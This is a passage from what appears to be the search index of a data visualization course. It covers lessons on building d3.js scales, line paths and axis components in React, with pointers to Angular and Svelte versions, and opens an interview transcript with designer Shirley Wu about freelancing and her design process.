React","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.05/creating-our-scales-in-react/#creating-our-scales","title":"Creating our scales","text":"<p>Next up, we need to create the scales to convert from the data domain to the pixel domain. Let's pop back to <code>src/Timeline.jsx</code>.</p> <p>We'll create scales just like we did in Module 1 \u2014 we'll need an time-based xScale and a linear yScale.</p> <pre><code>const xScale = d3.scaleTime()\n  .domain(d3.extent(data, xAccessor))\n  .range([0, dms.boundedWidth])\n\nconst yScale = d3.scaleLinear()\n  .domain(d3.extent(data, yAccessor))\n  .range([dms.boundedHeight, 0])\n  .nice()\n</code></pre> <p>A&gt;If you wanted to make creating scales easier, you could abstract the concept of a \"scale\" and add ease-of-use methods to your chart library. For example, you could make a method that takes a dimension (eg. <code>x</code>) and an accessor function and create a scale. A more comprehensive chart library can abstract redundant code and make it easier for collaborators who are less familiar with data visualization.</p> <p>Next, we'll make a scaled accessor function for both of our axes. These will take a data point and return the pixel value. This way, our <code>Line</code> component won't need any knowledge of our scales or data structure.</p> <pre><code>const xAccessorScaled = d =&gt; xScale(xAccessor(d))\nconst yAccessorScaled = d =&gt; yScale(yAccessor(d))\n</code></pre>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.05/creating-our-scales-in-react/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.06/drawing-our-data-in-react/","title":"Drawing our data","text":"<p>We already imported our <code>Line</code> component from our chart library. Let's render one instance inside of our <code>Chart</code>, passing it our data and scaled accessor functions.</p> <pre><code>&lt;Line\n  data={data}\n  xAccessor={xAccessorScaled}\n  yAccessor={yAccessorScaled}\n/&gt;\n</code></pre> <p>If we inspect our webpage in the Elements panel, we can see a new <code>&lt;path&gt;</code> element.</p> <p></p> <p>Let's see what's going on in <code>src/Chart/Line.jsx</code>.</p> <p>We have a basic element that renders a <code>&lt;path&gt;</code> element with a class name.</p> <pre><code>const Line = ({ type, data, xAccessor, yAccessor, y0Accessor, interpolation, ...props }) =&gt; {\n  return (\n    &lt;path {...props}\n      className={`Line Line--type-${type}`}\n    /&gt;\n  )\n}\n</code></pre> <p><code>Line</code> accepts <code>data</code> and accessor props, along with a <code>type</code> string. A <code>Line</code> can have a <code>type</code> of <code>\"line\"</code> or <code>\"area\"</code> \u2014 it makes more sense to combine these two types of elements because they are more similar than they are different. There is one more prop (<code>interpolation</code>), which we'll get back to later.</p> <p>Our first step is to create our <code>lineGenerator()</code>, which will turn our dataset into a <code>d</code> string for our <code>&lt;path&gt;</code>. Since <code>d3.line()</code> and <code>d3.area()</code> mimic our <code>type</code> prop, we can grab the right method with <code>d3[prop]()</code>.</p> <pre><code>const lineGenerator = d3[type]()\n  .x(xAccessor)\n  .y(yAccessor)\n  .curve(interpolation)\n</code></pre> <p><code>d3.area()</code> uses <code>.y0()</code> and <code>.y1()</code> to decide where the top and bottom of its path are. We'll need to add that extra logic only if we're creating an <code>area</code>.</p> <pre><code>if (type == \"area\") {\n  lineGenerator\n    .y0(y0Accessor)\n    .y1(yAccessor)\n}\n</code></pre> <p>Now we can use our <code>lineGenerator()</code> to convert our <code>data</code> into a <code>d</code> string.</p> <pre><code>const line = lineGenerator(data)\n</code></pre> <p>And we can use that generated string as our path's d attribute.</p> <pre><code>&lt;path {...props}\n  className={`Line Line--type-${type}`}\n  d={line}\n/&gt;\n</code></pre> <p>Nice! Now when we look at our webpage, we can see a squiggly line that updates every few seconds.</p> <p></p> <p>By having such flexible props, we allow the dev to change the interpolation of the line - they can choose from different d3 curve types for individual lines.</p> <p>For example, try changing the interpolation of <code>Line</code> in <code>/src/Timeline.jsx</code> to <code>d3.curveStepAfter</code>.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.06/drawing-our-data-in-react/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.07/drawing-our-peripherals-in-react/","title":"Drawing our peripherals","text":"<p>Next, we want to draw our axes. This is where even experienced d3.js and React.js developers get confused because both libraries want to handle creating new the DOM elements. Up until now, we've used <code>d3.axisBottom()</code> and <code>d3.axisLeft()</code> to append multiple <code>&lt;line&gt;</code> and <code>&lt;text&gt;</code> elements to a manually created <code>&lt;g&gt;</code>. element. But the core concept of React.js relies on giving it full control over the DOM.</p> <p>Let's first make a naive attempt at an Axis component, mimicking the d3.js code we've written so far. Since our Axis component is already imported, we can create a new instance in our render method. We'll need to specify the <code>dimension</code> and relevant <code>scale</code> of both of our axes.</p> <pre><code>&lt;Axis\n  dimension=\"x\"\n  scale={xScale}\n/&gt;\n&lt;Axis\n  dimension=\"y\"\n  scale={yScale}\n/&gt;\n</code></pre> <p>A&gt;Remember that SVG elements' z-indices are determined by their order in the DOM. If you want your line to overlap your axes, make sure to add the<code>&lt;Axis&gt;</code> components before the <code>&lt;Line&gt;</code> in your render method.</p> <p>Let's head over to <code>src/Chart/Axis-naive.jsx</code> to flesh out our Axis component. There's not much going on here yet, just a basic React Component that accepts a dimension (either x or y), a scale, and a tick formatting function.</p> <pre><code>const Axis = ({ dimension, scale, ...props }) =&gt; {\n  return (\n    &lt;g {...props}\n      className=\"Axis\"\n    /&gt;\n  )\n}\n</code></pre> <p>Let's start by pulling in the dimensions of our chart, using the custom React hook we created earlier.</p> <pre><code>const dimensions = useDimensionsContext()\n</code></pre> <p>Since we'll want to use <code>d3.axisBottom()</code> or <code>d3.axisLeft()</code>, based on the <code>dimension</code> prop, let's make a map so we can dynamically grab the correct d3 method. This is one of many abstractions that can help to keep our chart library's API simple for collaborators less familiar with d3.</p> <pre><code>const axisGeneratorsByDimension = {\n  x: \"axisBottom\",\n  y: \"axisLeft\",\n}\n</code></pre> <p>Now we can use our mapping to create a new axis generator, based on our <code>scale</code> prop.</p> <pre><code>const axisGenerator = d3[axisGeneratorsByDimension[dimension]]()\n  .scale(scale)\n</code></pre> <p>In the past, we've used our axisGenerator on the d3 selection of a newly created <code>&lt;g&gt;</code> element. React gives us a way to access DOM nodes created in the render method: Refs. To create a React Ref, we create a new variable with <code>useRef()</code> and add it as a <code>ref</code> attribute to the element we want to target.</p> <pre><code>const ref = useRef()\n\nreturn (\n    &lt;g {...props}\n      ref={ref}\n    /&gt;\n)\n</code></pre> <p>Now when we access <code>ref.current</code>, we'll get a reference to the <code>&lt;g&gt;</code> DOM node.</p> <p>Let's transform <code>ref.current</code> into a d3 selection by wrapping it with <code>d3.select()</code>, then transition our axis in using our <code>axisGenerator</code>.</p> <p>A&gt;Note: we'll have to ensure that <code>ref.current</code> exists first, since this code will run before the first render.</p> <pre><code>if (ref.current) {\n  d3.select(ref.current)\n    .transition()\n    .call(axisGenerator)\n}\n</code></pre> <p>Just like that, we have axes! Something is missing though.</p> <p></p> <p>Right! We'll need to shift our x axis to the bottom of the chart. Let's add a <code>transform</code> attribute to our <code>&lt;g&gt;</code> element.</p> <pre><code>&lt;g {...props}\n  ref={ref}\n  transform={\n    dimension == \"x\"\n      ? `translate(0, ${dimensions.boundedHeight})`\n      : null\n  }\n/&gt;\n</code></pre> <p>Perfect, now that looks like a timeline!</p> <p></p> <p>While this way works, we'll talk about a preferable method in the next lesson.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.07/drawing-our-peripherals-in-react/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.08/drawing-our-peripherals-in-react-take-two/","title":"Drawing our peripherals, take two","text":"<p>Now that we've shown how easy it is to plug basic d3 code into React, let's talk about why it's not a good idea.</p> <p>React uses a fancy reconciliation algorithm to decide which DOM elements to update. It does this by creating a virtual DOM and diffing against the real DOM. When we mutate the DOM outside of React render methods, we're removing the performance benefits we get and will unnecessarily re-render elements.</p> <p>Short-cutting around React render methods also makes our code less declarative. Usually, you can depend on the resulting DOM to closely align to any JSX you see in a component's render method. When you come back to a component you wrote a few months ago, you'll thank yourself for making the output obvious.</p> <p>In a pinch, using React to create a wrapper element to modify with d3 (like we just did) will do. You might need to do this for special cases, like animating an arc. But try to lean towards solely creating elements with React and using d3 as more of a utility library. This will keep your app speedy and less \"hacky\".</p> <p>Even without its DOM modifying methods, d3 is a very powerful library. In fact, we created most of our timeline without needing to re-create a d3 generator function. For example, creating a <code>d</code> string for our Line component would have been tricky without <code>d3.line()</code>.</p> <p>But how does this look in practice? Let's re-create our Axis component without using any axis generators.</p> <p></p> <p>Switch your Axis import in <code>src/Timeline.jsx</code> to use the <code>Axis</code> file.</p> <pre><code>import Axis from \"./Chart/Axis\"\n</code></pre> <p>When we open up <code>src/Chart/Axis.jsx</code>, we should see three basic React components.</p> <p>Similar to how <code>d3.axisBottom()</code> and <code>d3.axisLeft()</code> are different methods, we want to split out <code>x</code> and <code>y</code> axes into different components. This will keep our code clean and prevent too many ternary statements.</p> <p>The first component is a directory component that grabs the chart dimensions and renders the appropriate <code>Axis</code>, based on the <code>dimension</code> prop.</p> <pre><code>const axisComponentsByDimension = {\n  x: AxisHorizontal,\n  y: AxisVertical,\n}\nconst Axis = ({ dimension, ...props }) =&gt; {\n  const dimensions = useDimensionsContext()\n  const Component = axisComponentsByDimension[dimension]\n  if (!Component) return null\n\n  return (\n    &lt;Component {...props}\n      dimensions={dimensions}\n    /&gt;\n  )\n}\n</code></pre> <p>The other two components, <code>AxisHorizontal</code> and <code>AxisVertical</code>, are specific <code>Axis</code> implementations. Let's start by fleshing out <code>AxisHorizontal</code>.</p> <pre><code>function AxisHorizontal (\n  { dimensions, label, formatTick, scale, ...props }\n) {\n  return (\n    &lt;g className=\"Axis AxisHorizontal\" {...props}&gt;\n    &lt;/g&gt;\n  )\n}\n</code></pre> <p>Since we're not using a d3 axis generator, we'll need to generate the ticks ourselves. Fortunately, many of the methods d3 uses internally are also available for external use. d3 scales have a <code>.ticks()</code> method that will create an array with evenly spaced values in the scale's domain.</p> <p>We can see this in action if we <code>console.log(scale.ticks())</code>.</p> <p></p> <p>By default, <code>.ticks()</code> will aim for ten ticks, but we can pass a specific count to target. Note that <code>.ticks()</code> will aim for the count, but also tries to create ticks with meaningful intervals: a week in this example.</p> <p>The number of ticks we want will depend on the chart width, though \u2014 ten ticks will likely crowd our x axis. Let's aim for one tick per 100 pixels for small screens and one tick per 250 pixels for wider screens.</p> <pre><code>function AxisHorizontal (\n  { dimensions, label, formatTick, scale, ...props }\n) {\n  const numberOfTicks = dimensions.boundedWidth &lt; 600\n        ? dimensions.boundedWidth / 100\n        : dimensions.boundedWidth / 250\n\n  const ticks = scale.ticks(numberOfTicks)\n</code></pre> <p>Great! We're ready to render some elements. First, we'll shift our axis to the bottom of the chart. Remember: our <code>&lt;Axis&gt;</code> will render within our shifted group from <code>&lt;Chart&gt;</code>, so we don't have to worry about the top margin.</p> <pre><code>&lt;g className=\"Axis AxisHorizontal\" transform={`translate(0, ${\n  dimensions.boundedHeight\n})`} {...props}&gt;\n</code></pre> <p>Most charts mark the end of the bounds with a line - let's draw a line above our axis to make it clear where the bottom of the y axis is.</p> <p>Remember that <code>&lt;line&gt;</code> elements are positioned with <code>x1</code>, <code>x2</code>, <code>y1</code>, and <code>y2</code> attributes. We'll want to draw a line from <code>[0,0]</code> to <code>[width, 0]</code> \u2014 since <code>x1</code>, <code>x2</code>, and <code>y1</code> will all be <code>0</code> (the default), we can leave those attributes out.</p> <pre><code>&lt;line\n  className=\"Axis__line\"\n  x2={dimensions.boundedWidth}\n/&gt;\n</code></pre> <p>Next, we'll create the text for each of our ticks. To do this, we want to render a <code>&lt;text&gt;</code> element for each item in our <code>ticks</code> array. Let's shift each element down by 25px to give the axis line some breathing room and shift it to the right by converting the tick into the pixel domain using our <code>scale</code>.</p> <pre><code>{ticks.map((tick, i) =&gt; (\n  &lt;text\n    key={tick}\n    className=\"Axis__tick\"\n    transform={`translate(${scale(tick)}, 25)`}\n  &gt;\n    { formatTick(tick) }\n  &lt;/text&gt;\n))}\n</code></pre> <p>When we look at our chart, we can see a wonderful x axis with ticks:</p> <p></p> <p>Those dates don't look right, though. Note that our react Axis component accepts a <code>formatTick</code> prop, which will be a function that takes a tick and converts it into a human-readable string. d3 axis generators have built-in logic that will detect date strings and format them correctly.</p> <p>Let's override the default <code>formatTick</code> prop and pass <code>formatDate</code> defined at the top of <code>src/Timeline.jsx</code>.</p> <pre><code>&lt;Axis\n  dimension=\"x\"\n  scale={xScale}\n  formatTick={formatDate}\n/&gt;\n</code></pre> <p>Much better!</p> <p></p> <p>In your own React chart library, it might be a good idea to detect whether or not the tick is a date object and format it accordingly. That will depend on your use cases: how often will you need to format dates? Will you want all dates to be formatted the same way?</p> <p>Lastly, we'll want to render the label for our axis. Since we might not always want an axis label, we'll check if the <code>label</code> prop exists before rendering our label. We'll also horizontally center our label and shift it down 60 pixels to give our ticks space.</p> <pre><code>{label &amp;&amp; (\n  &lt;text\n    className=\"Axis__label\"\n    transform={`translate(${dimensions.boundedWidth / 2}, 60)`}\n  &gt;\n    { label }\n  &lt;/text&gt;\n)}\n</code></pre> <p>Our <code>AxisVertical</code> will look very similar to <code>AxisHorizontal</code>. We'll start with the same basic component.</p> <pre><code>function AxisVertical (\n  { dimensions, label, formatTick, scale, ...props }\n) {\n  return (\n    &lt;g className=\"Axis AxisVertical\" {...props}&gt;\n    &lt;/g&gt;\n  )\n}\n</code></pre> <p>Try to fill out the component as much as possible without looking about the completed code below. You might want to tweak the <code>numberOfTicks</code> parameter \u2014 these ticks will be stacked vertically and might have more room.</p> <p>Remember that your y axis label will need to be rotated -90 degrees to fit.</p> <p></p> <pre><code>function AxisVertical (\n  { dimensions, label, formatTick, scale, ...props }\n) {\n  const numberOfTicks = dimensions.boundedHeight / 70\n\n  const ticks = scale.ticks(numberOfTicks)\n\n  return (\n    &lt;g className=\"Axis AxisVertical\" {...props}&gt;\n      &lt;line\n        className=\"Axis__line\"\n        y2={dimensions.boundedHeight}\n      /&gt;\n\n      {ticks.map((tick, i) =&gt; (\n        &lt;text\n          key={tick}\n          className=\"Axis__tick\"\n          transform={`translate(-16, ${scale(tick)})`}\n        &gt;\n          { formatTick(tick) }\n        &lt;/text&gt;\n      ))}\n\n      {label &amp;&amp; (\n        &lt;text\n          className=\"Axis__label\"\n          style={{\n            transform: `translate(-56px, ${\n              dimensions.boundedHeight / 2\n            }px) rotate(-90deg)`\n          }}\n        &gt;\n          { label }\n        &lt;/text&gt;\n      )}\n    &lt;/g&gt;\n  )\n}\n</code></pre> <p>How did you do? No worries if you peeked! This code will be here for you if you need to refer back to it when you set up your own charts.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.08/drawing-our-peripherals-in-react-take-two/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.08/drawing-our-peripherals-in-react-take-two/#wrap-up","title":"Wrap up","text":"<p>See how we could replicate the d3 axes with a small amount of code? When we know how to do something one way (such as draw axes with a d3 axis generator), this knowledge prevents us from finding another way. D3 has many convenient methods, but they aren't always the best way to draw a chart. In fact, it can often help us to circumvent itself with smaller methods that it uses.</p> <p>Another benefit of creating our own axes is that we can customize our charts however we want. Want tick marks but no line for your y axes? No problem! We can also style our axes in one place and ensure that our charts are consistent, even when created by different developers.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.09/setting-up-interactions-in-react/","title":"Setting up interactions","text":"<p>In a production app, we would next want to define our interactions. Most charts could benefit from a tooltip - this could be implemented in various ways.</p> <ol> <li> <p>We could add a chart listener rect to our <code>Chart</code> component that would sit on top of its <code>children</code>. We could listen to all mouse events and use <code>d3.pointer()</code> and <code>d3.leastIndex()</code> to find the closest point and position the tooltip using our scales (similar to our timeline example in Module 5).</p> </li> <li> <p>We could add a boolean property to <code>Line</code> that creates the listener rect, tying the tooltip to a specific data element. This might be beneficial if we have many types of charts that need different types of listeners (like our scatter plot example in Module 5).</p> </li> </ol>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.09/setting-up-interactions-in-react/#wrapping-up","title":"Wrapping up","text":"<p>Now that we've created some basic chart components and a Timeline component, we have a general idea of how to weave React.js and d3.js together. The general idea is to use React.js for any DOM rendering and d3.js as a utility library.</p> <p>Populate the rest of the dashboard by switching the import statements in <code>src/App.jsx</code> to use the files in the <code>src/completed/</code> folder.</p> <pre><code>// import Timeline from \"./Timeline\"\n// import ScatterPlot from \"./ScatterPlot\"\n// import Histogram from \"./Histogram\"\nimport Timeline from \"./completed/Timeline\"\nimport ScatterPlot from \"./completed/ScatterPlot\"\nimport Histogram from \"./completed/Histogram\"\n</code></pre> <p>When we look at our browser again, we'll see that the whole dashboard is populated!</p> <p></p> <p>Check out the code in</p> <p><code>src/completed/ScatterPlot.jsx</code> and</p> <p><code>src/completed/Histogram.jsx</code></p> <p>to see how we converted our d3 code to React + d3 code. For example, instead of using a data binding (<code>.join()</code>) we simply map over each item in our dataset.</p> <p>The completed timeline has an extra area with a gradient fill - check out how that was implemented. One important piece of information to remember here is that our <code>Timeline</code> component could appear multiple times on a page, so we need a unique id per gradient instance in order to grab the right one. This is simple enough to implement, but easy to overlook.</p> <p>If you're feeling comfortable, play around with one of the charts - what if we added a color scale, or sized the circles by a metric? What would it look like to implement a timeline with multiple lines? What about something radically different, like a radar chart? Remember to let React handle the DOM changes and utilize d3 as much as possible for data manipulation and other conveniences like scales.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.10/d3-and-angular/","title":"Using D3 with Angular.js","text":"<p>Angular is a framework for building modern, component-based user interfaces in HTML and Typescript. Typescript is a superset of Javascript: it looks very similar to Javascript and gets compiled to Javascript, but it has extra features like static typing, classes, and interfaces.</p> <p>While the codebase looks very different to the React codebase, the chart library structure is largely the same.</p> <p></p> <p>If you're not interested in developing Angular applications, I'd recommend poking around and noticing how similar the code is to the React code. If you are interested in developing d3 + Angular apps, the best route would be:</p> <ol> <li>Run through the previous lessons with the React code</li> <li>Try to fill out the <code>/src/app/timeline/timeline.component.ts</code> component (including the nested chart, line, &amp; axis components), following our steps</li> <li>Check out the completed code in <code>/src/app/completed</code> after, or if you get stuck. You can switch these out if you change the imports in <code>src/app/app.module.ts</code></li> </ol> <pre><code>// import { TimelineComponent } from './timeline/timeline.component'\n// import { ScatterComponent } from './scatter/scatter.component'\n// import { HistogramComponent } from './histogram/histogram.component'\n// import { ChartComponent } from './chart/chart.component'\n// import { AxisComponent } from './chart/axis/axis.component'\n// import { LineComponent } from './chart/line/line.component'\n// import { CirclesComponent } from './chart/circles/circles.component'\n// import { BarsComponent } from './chart/bars/bars.component'\n// import { GradientComponent } from './chart/gradient/gradient.component'\nimport { TimelineComponent } from './completed/timeline/timeline.component'\nimport { ScatterComponent } from './completed/scatter/scatter.component'\nimport { HistogramComponent } from './completed/histogram/histogram.component'\nimport { ChartComponent } from './completed/chart/chart.component'\nimport { AxisComponent } from './completed/chart/axis/axis.component'\nimport { LineComponent } from './completed/chart/line/line.component'\nimport { CirclesComponent } from './completed/chart/circles/circles.component'\nimport { BarsComponent } from './completed/chart/bars/bars.component'\nimport { GradientComponent } from './completed/chart/gradient/gradient.component'\n</code></pre>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.10/d3-and-angular/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.10/code/draft/","title":"Index","text":"<p>Run <code>ng serve</code> for a dev server. Navigate to <code>http://localhost:4200/</code>. The app will automatically reload if you change any of the source files.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.10/code/end/","title":"Index","text":"<p>Run <code>ng serve</code> for a dev server. Navigate to <code>http://localhost:4200/</code>. The app will automatically reload if you change any of the source files.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.11/d3-and-svelte/","title":"Using D3 with Svelte.js","text":"<p>Svelte is a framework for building reactive, component-based user interfaces. It's a great framework for devs new to javascript frameworks, and it leans into reactive coding - your variables will update when their dependencies do!</p> <p>While the codebase looks very different to the React codebase, the chart library structure is largely the same.</p> <p></p> <p>If you're not interested in developing Svelte applications, I'd recommend poking around and noticing how similar the code is to the React code. If you are interested in developing d3 + Svelte apps, the best route would be:</p> <ol> <li>Run through the previous lessons with the React code</li> <li>Try to fill out the <code>/src/Timeline.svelte</code> component (including the nested chart, line, &amp; axis components), following our steps</li> <li>Check out the completed code in <code>/src/completed</code> after, or if you get stuck. You can switch these out if you change the imports in <code>src/App.svelte</code></li> </ol> <pre><code>// import Timeline from \"./Timeline.svelte\";\n// import ScatterPlot from \"./ScatterPlot.svelte\";\n// import Histogram from \"./Histogram.svelte\";\nimport Timeline from \"./completed/Timeline.svelte\";\nimport ScatterPlot from \"./completed/ScatterPlot.svelte\";\nimport Histogram from \"./completed/Histogram.svelte\";\n</code></pre>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.11/d3-and-svelte/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_08/lesson_08.00/coming-soon/","title":"Interviews","text":"<p>Coming soon! Interviews with amazing experts in the data visualization field. You'll learn about how different people get into data visualization, what most excites them, and their tips &amp; tricks.</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.01/shirley-wu/","title":"Shirley Wu","text":"<p>Shirley and I talk about her job title, how she got into data visualization, how working in industry is different than working as a freelancer, and her new book!</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.01/shirley-wu/#links","title":"Links","text":"<p>website @sxywu</p>"},{"location":"datav/codes/code/course-full/module_08/lesson_08.01/shirley-wu/#transcript","title":"Transcript","text":"<p>Amelia: [00:00:00]</p> <p>So today we're talking to Shirley Wu, Shirley Wu is a freelance data viz designer.</p> <p>I know you have your own special term for it that you made up.  If you can give us a little background on what you do, that'd be great.</p> <p>Shirley: [00:00:13]</p> <p>Yeah. So the title I made for myself, because I work for myself is. Independent. Oh, there's been evolution. So the latest evolution is independent data visualization designer and engineer.</p> <p>Yeah. I feel like this is more just me being annoyed at people being like, what's your title? Because I don't know what my title is, but essentially what that means is I work with a variety of different clients, usually in tech and media and journalism. and I help tell visual stories with their data.</p> <p>Amelia: [00:00:48]</p> <p>I love it. And I think it's such a new field that even if you have a shorter title, no, one's going to know what it means anyway. So I love that it's long and descriptive.</p> <p>Shirley: [00:00:59]</p> <p>I'm just like, this is exactly what I do for you.</p> <p>Amelia: [00:01:02]</p> <p>It's just like reading a sentence. and I know you weren't always \"this\" job title. So if you could give like a little bit of background, like how you got started and how you got into this field, I think that'd be really helpful.</p> <p>Shirley: [00:01:19]</p> <p>Yeah, of course. so when I first started, my career, I actually went to a big data company as a front end engineer, and that's kind of where I came across d3. And as I started kind of using d3 in my work, and then I started kind of going to the local Bay area, d3 meetups. That's when I was like, Oh, data visualization is a thing.</p> <p>and this is a thing that I actually really enjoy. And so for my second job, I went to a startup and it was an enterprise security center, a startup, and I was... my official title there. So my first official title was, I think, Front End Engineer, I think, or Software Engineer. And I think my second official title was Member of Technical Staff, which is vague, but what I did for them is they wanted, essentially a visual tool to like help their customers kind of figure out how to secure their data center.</p> <p>So instead of doing it by like tables or anything, they wanted a visualization that was kind of like part of their products. And so that's what I went and helped them build for a two and a half years. I think, as essentially I was a specialized Data Visualization Engineer, I guess, is probably the title now.</p> <p>and then I think after that I wanted to go and try out things on my own, mainly because I realized I really enjoy data visualization, but not as much enterprise security. So then I wanted to kind of try freelancing to see what other sorts of companies were out there. What industries were starting to be in need of data visualization.</p> <p>And that's how I started freelancing. And then you knew like people always ask you for titles and I'm like, I'm a freelancer and I make data visualizations and they're like, what does that mean? And I'm like, well, I design and I code. So that's, that's the title</p> <p>Amelia: [00:03:24]</p> <p>Love it. I'm curious</p> <p>when you were working at these companies, Oftentimes your developer or your designer... were you designing the data visualizations or were you getting designs and then implementing them?</p> <p>Shirley: [00:03:37]</p> <p>Yeah. So, that's a really great question. So I think subconsciously that's probably. Like, you know, hindsight 20/20, that's probably one of the reasons why I wanted to venture off on my own, which is, even at my startup, which was quite like hierarchically, like vertically very fluid. And there wasn't that much structure and, you know, it had that sort of everybody does it kind of vibe, but even there, I was slotted as Software Engineer. And so like, fortunately I worked with people that were very much willing to take feedback. So the designer that I worked with, he was really great and took a lot of feedback. The product manager took a lot of feedback, but even then my role was software engineer, but I was like very much interested in kind of the whole process.</p> <p>I was like very much interested in like the, customer feedback and like why the PM was thinking about certain features. I was very much interested in how those features were getting translates into designs and because I feel like by the time it gets to us as software engineers, there are a lot of decisions that have already been made.</p> <p>And that's kind of hard to develop for without the original context. So it was because of that that I was like, and in my personal times, I had been doing all these data visualization projects. And for all of those, I get to do the whole process, right? Of going out and collecting my own data and doing my own design and doing the code.</p> <p>So, I think not being able to be involved in the whole process in my full-time job, that was probably one of the things where it really drove me to be like, \"Okay, I really want to try and go off on my own and see if I can do this whole process with like different clients.\"</p> <p>Amelia: [00:05:35]</p> <p>I love that.</p> <p>And that really resonates with me especially with data, you can't just like. Say, Oh, these are the requirements. Let's make a design and then hand it off to engineering because once you actually implement it, it might not be at all what the designs look like. You just really have to know what the data look like before you do the design.</p> <p>And it's more of an iterative process where you need those tight feedback loops. And that can be really hard if you're sequestered, even in a small company, to this one part of the process.</p> <p>How are things going doing freelance, where you kind of have all the control?</p> <p>Shirley: [00:06:13]</p> <p>It's funny. Well, I actually wanted to say, I really enjoyed that part, in one of the talks that you gave, about kind of how you prototype and how you iterate, because like, that really is very much how very similar to how I work nowadays. And that's a really astute observation you made where I think my frustration was due to the fact that I couldn't do that iterative cycle within that environment. And I think that's really a product of 2014, 2015 data visualization of, I think it was so still so new, in  the business area that I think the conversation hadn't quite evolved to, \"Oh, we actually need to involve the data visualization person much earlier in the conversation\" to make sure that like what actually gets designed is very reflective of the data itself.</p> <p>And I think that's a realization that we have now, and hopefully I'm hoping that it's something that's now much more implemented and much more commonplace in companies. That's my hope. I don't know if it really is, but yeah, I wanted to kind of,bounce off of that.</p> <p>But yeah, for freelance now I really enjoy the whole being able to do the whole process. But I think at the very beginning, what I didn't realize was. how much, I didn't know. I was a sophomore engineer, very much trained as a software engineer and I'm like, \"I want to take client projects.\" And it took me years to learn how much I did not know in terms of the design aspect, like the information design.</p> <p>I think there was like a good year where I was like bumbling around just trying like different things and seeing what sticks from a design perspective. And I knew I made a lot of design, faux paus, for data viz. I'm actually really surprised that I don't get called out more often, like the bad like design decisions I made.</p> <p>Then, you know, trying to kind of make up for that and then realizing that I'm really bad at the data side. I don't really know how to analyze it and trying to figure out a process for that. So it's been a lot of self studying, a lot of realizing what I was missing and self studying.</p> <p>And I think there was a period of time at the beginning of the freelancing where, because I was trying to... you know, when you're a freelancer, you have to be like, \"I'm the expert.\" Right? And so there was like a while where I was feeling major imposter syndrome, because I was like, okay, I'm an expert in like this one subset, and I'm trying to convince you to hire me for this whole process and I'm not an expert in these. So that's a... I don't know if that answers your original question...</p> <p>Amelia: [00:09:22]</p> <p>I don't remember my original question, but that was really interesting. and I have so many follow-up questions, but I guess my main one is: do you think it would have been better for you to wait a little bit longer? Or, what are some things you could have done when you were working at a company to kind of solidify all of these areas, so that you'd feel more ready?</p> <p>Shirley: [00:09:46]</p> <p>Mm, great question. So I don't think, waiting any longer back then, cause I went freelance in 2016, I don't think waning any longer back then would have helped because, I think again, it comes back to, there wasn't as much of a culture of including data visualization, like data visualization was an afterthought for a lot of companies back then. I don't know if that's so true now, but I don't think, even with kind of the openness of the startup I was at, I don't think, I think it would have taken me a very long time to get to the point where they would have, you know, let me be fully involved in the whole process.</p> <p>And so I feel like going freelance let me get a crash course on the whole process where like it got crammed into like the space of a year to a year and a half. Whereas I think if I had kept on staying at a company, no matter which company, because companies just move a little bit slower, right?</p> <p>Like, unless you're like a really nimble, like tiny little team, a company will always move much slower than an individual. And so I don't think I would have been able to get that crash course, and I think it would have taken me much longer to get that same education at a company. And I think, even though I was doing the whole process with my personal projects, back when I was full-time the very fact that I did not have to design the personal projects for any specific client, any specific stakeholder meant I was only like designing for myself and you know, when you're designing it for you, you're like, \"I'll do whatever I want!\" So it really was that having clients really taught me what I needed to learn.</p> <p>Amelia: [00:11:44]</p> <p>Yeah, definitely. Especially since data visualization is about communication, right? You're communicating data. So having that feedback from someone is really nice because if it makes sense to you, you know, you've been working on it, you've been thinking about the data. Of course, that makes sense to you, but that doesn't necessarily mean... it's like built in user testing, which I think is really great.</p> <p>I've done both client projects and personal projects. And I find client projects almost easier because you have this built-in feedback loop and you have these constraints to work in. I really like that.</p> <p>One other thing I wanted to ask you about is, when you have a new project you're working on, what is the process that you normally go through? Do you start coding right away or do you sketch a little bit? How do you approach new problems?</p> <p>Shirley: [00:12:35]</p> <p>Ooh, I like this one.</p> <p>Okay. So, So, yeah, so kind of, what I was mentioning earlier about how I've had to figure out the whole proces during my freelance time. I think I did a lot of that while working on a personal project called Data Sketches. It's a project with my really good friend Nadieh Bremer, who's an amazing data visualization... I don't know who her title, actually... she's also independent. So a data visualization person, creator/designer. It's a project where we chose 12 topics and we each did a visualization project for that for like 24 projects. And I think the most interesting part was that we required ourselves to do a writeup per project. And I think that really made me be able to introspect on my process. And so from that, what I learned is kind of, my process is very much like: first get the data, then go through and look at what each of the metadata is. And from there, start formulating some hypotheses, some interesting questions.</p> <p>Then take those questions and then kind of use, I personally use Vega light as a very easy charting tool. And then I plug the data into Vega light, into different charts to kind of see if those questions have good answers. And when they do, when I kind of find that central message, that's when I start actually designing and sketching my ideas. And once I sketch, when I feel satisfied, I start coding it.</p> <p>And of course, like once I code it, sometimes it turns out to be good and sometimes it doesn't, then I have to go back through the whole process and that's kind of the iterative  process that we've talked about before. And, the whole process I described is in the Data Sketches project and also, in the new Data Sketches book that we have coming out, in much more detail, if you're interested in any of that.</p> <p>Amelia: [00:14:57]</p> <p>Yeah! I got some sneak peeks of a few chapters and you guys go into a ton of detail. 